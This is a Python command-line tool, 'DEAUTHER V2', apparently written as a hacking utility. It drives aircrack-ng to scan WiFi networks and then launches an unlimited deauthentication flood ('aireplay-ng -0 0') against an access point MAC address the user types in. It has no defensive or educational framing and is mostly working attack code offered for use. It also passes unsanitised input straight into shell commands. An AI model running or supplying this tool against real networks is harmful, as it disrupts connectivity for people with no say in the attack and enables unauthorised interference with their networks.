#!/usr/bin/env python3

import os
import sys
import time

# =========================
# COLORS
# =========================
ASH = "\033[1;90m"
RED = "\033[1;91m"
GREEN = "\033[1;92m"
YELLOW = "\033[1;93m"
CYAN = "\033[1;96m"
WHITE = "\033[1;97m"

# =========================
# TYPE / LOADING EFFECT
# =========================
def typefx(text, speed=0.003):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(speed)
    print()

def loading(text="Loading", dots=3, delay=0.25):
    for i in range(dots):
        sys.stdout.write(f"\r{text}{'.' * (i+1)}{' ' * (dots-i)}")
        sys.stdout.flush()
        time.sleep(delay)
    print()

# =========================
# ASCII BANNER
# =========================
def banner():
    os.system("clear")
    print(f"""
{ASH}@@@@@@@   @@@@@@@@   @@@@@@   @@@  @@@  @@@@@@@  @@@  @@@  @@@@@@@@  @@@@@@@
{ASH}@@@@@@@@  @@@@@@@@  @@@@@@@@  @@@  @@@  @@@@@@@  @@@  @@@  @@@@@@@@  @@@@@@@@
{ASH}@@!  @@@  @@!       @@!  @@@  @@!  @@@    @@!    @@!  @@@  @@!       @@!  @@@
{ASH}!@!  @!@  !@!       !@!  @!@  !@!  @!@    !@!    !@!  @!@  !@!       !@!  @!@
{ASH}@!@  !@!  @!!!:!    @!@!@!@!  @!@  !@!    @!!    @!@!@!@!  @!!!:!    @!@!!@!
{ASH}!@!  !!!  !!!!!:    !!!@!!!!  !@!  !!!    !!!    !!!@!!!!  !!!!!:    !!@!@!
{ASH}!!:  !!!  !!:       !!:  !!!  !!:  !!!    !!:    !!:  !!!  !!:       !!: :!!
{ASH}:!:  !:!  :!:       :!:  !:!  :!:  !:!    :!:    :!:  !:!  :!:       :!:  !:!
{ASH}:::: ::   :: ::::   ::   :::  ::::: ::    :::    :::  :::  :: ::::   :::   :::
{ASH}:: : :    :: ::::   ::   : :   : :: ::     :      :   : :  : :: ::   ::     :::
{WHITE}                DEAUTHER V2 — BY JAILIDEA >_
    """)

# =========================
# SELECT NETWORK INTERFACE
# =========================
def select_interface():
    typefx(f"{YELLOW}Scanning network interfaces...\n")
    os.system("iwconfig")
    print("")
    iface = input(f"{CYAN}Enter your WiFi interface (e.g., wlan0, wlx*) → {WHITE}")
    return iface

# =========================
# WIFI SCANNER
# =========================
def scan_network(iface):
    loading("Starting WiFi scanner")
    typefx(f"{GREEN}Press CTRL + C when you see your target.\n")

    try:
        os.system(f"airodump-ng {iface}")
    except KeyboardInterrupt:
        typefx(f"\n{YELLOW}Scanner stopped. Proceeding to target selection.\n")

# =========================
# RUN DEAUTH ATTACK
# =========================
def deauth_attack(iface):
    target_mac = input(f"{RED}Enter Target MAC Address → {WHITE}")
    channel = input(f"{YELLOW}Channel (press Enter to skip) → {WHITE}")

    loading("Preparing deauth attack")

    if channel.strip() != "":
        os.system(f"airmon-ng stop {iface}")
        os.system(f"airmon-ng start {iface} {channel}")

    typefx(f"{RED}Starting deauth attack...{WHITE}")
    time.sleep(1)

    os.system(f"aireplay-ng -0 0 -a {target_mac} {iface}")

# =========================
# MAIN MENU
# =========================
def menu():
    while True:
        banner()
        print(f"""
{WHITE}[{GREEN}1{WHITE}] Run Manual Deauth Attack
{WHITE}[{RED}0{WHITE}] Exit Program
        """)
        choice = input(f"{CYAN}Choose an option → {WHITE}")

        if choice == "1":
            banner()
            iface = select_interface()
            scan_network(iface)
            deauth_attack(iface)
            input(f"\n{GREEN}Done. Press Enter to return to the menu...")
        elif choice == "0":
            typefx(f"{RED}Exiting...", 0.01)
            loading("Goodbye")
            sys.exit()
        else:
            typefx(f"{RED}Invalid input. Try again.", 0.01)
            time.sleep(1)

# =========================
# RUN PROGRAM
# =========================
if __name__ == "__main__":
    try:
        menu()
    except KeyboardInterrupt:
        print(f"\n{RED}Program terminated.{WHITE}")
